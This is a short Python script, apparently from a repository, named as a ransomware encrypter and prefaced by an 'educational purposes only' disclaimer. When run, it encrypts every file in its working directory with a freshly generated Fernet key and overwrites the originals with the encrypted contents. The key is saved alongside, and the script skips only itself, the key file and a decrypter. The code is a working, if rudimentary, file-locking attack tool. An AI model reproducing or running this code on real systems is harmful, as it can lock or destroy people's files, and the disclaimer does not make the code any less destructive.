## Legal Disclaimer
"""
This project is intended for educational purposes only.

The encryption and decryption scripts included in this repository are provided to demonstrate how symmetric key cryptography (Fernet) works using Python's `cryptography` library.

Under no circumstances should this code be used to encrypt, lock, or modify data on systems or devices that you do not own or do not have explicit permission to access.

The developer is not responsible for any misuse, damage, or legal consequences resulting from the use of this code. By using or sharing this project, you agree to use it ethically and legally.

Use at your own risk.
"""


import os
from cryptography.fernet import Fernet

file_list = []

# Loop through all files in the current directory
for file in os.listdir():
    # Skip the encryption script, key file, and decryption script
    if file == "ransom_encrypter.py" or file == "generated.key" or file == "ransom_decrypter.py":
        continue
    # Add files (not directories) to the file_list
    if os.path.isfile(file):
        file_list.append(file)

# Print the list of files to be encrypted
print(file_list)

# Generate a new Fernet encryption key
key = Fernet.generate_key()
print(key)

# Save the encryption key to a file named 'generated.key'
with open("generated.key", "wb") as generatedKey:
    generatedKey.write(key)

# Encrypt each file in the file_list using the generated key
for file in file_list:
    # Read the contents of the file in binary mode
    with open(file, "rb") as the_file:
        contents = the_file.read()

    # Encrypt the contents using Fernet
    contents_encrypted = Fernet(key).encrypt(contents)

    # Overwrite the original file with the encrypted contents
    with open(file, "wb") as the_file:
        the_file.write(contents_encrypted)
